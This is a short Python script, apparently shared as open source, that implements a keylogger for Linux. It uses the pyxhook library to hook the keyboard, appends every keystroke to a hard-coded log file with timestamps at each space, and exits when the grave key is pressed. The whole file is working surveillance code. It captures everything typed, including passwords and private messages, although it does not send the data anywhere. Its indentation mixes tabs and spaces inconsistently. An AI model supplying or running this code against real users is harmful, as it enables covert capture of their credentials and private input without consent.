"""
Copyright (c) 2015, Aman Deep
All rights reserved.


A simple keylogger witten in python for linux platform
All keystrokes are recorded in a log file.

The program terminates when grave key(`) is pressed

grave key is found below Esc key
"""

import pyxhook
import datetime
#change this to your log file's path
log_file='/home/pi/drive3/file.log'

#this function is called everytime a key is pressed.
def OnKeyPress(event):
  if event.Ascii==32: #32 is the ascii value of the Space key
        fob=open(log_file,'a')
        fob.write('\t')
	date_=str(datetime.datetime.now().time())
	fob.write(date_)
	fob.write('\n')

	
  else:
  	fob=open(log_file,'a')
  	fob.write(event.Key)
  	if event.Ascii==96: #96 is the ascii value of the grave key (`)
		fob.close()
		new_hook.cancel()
#instantiate HookManager class
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()  
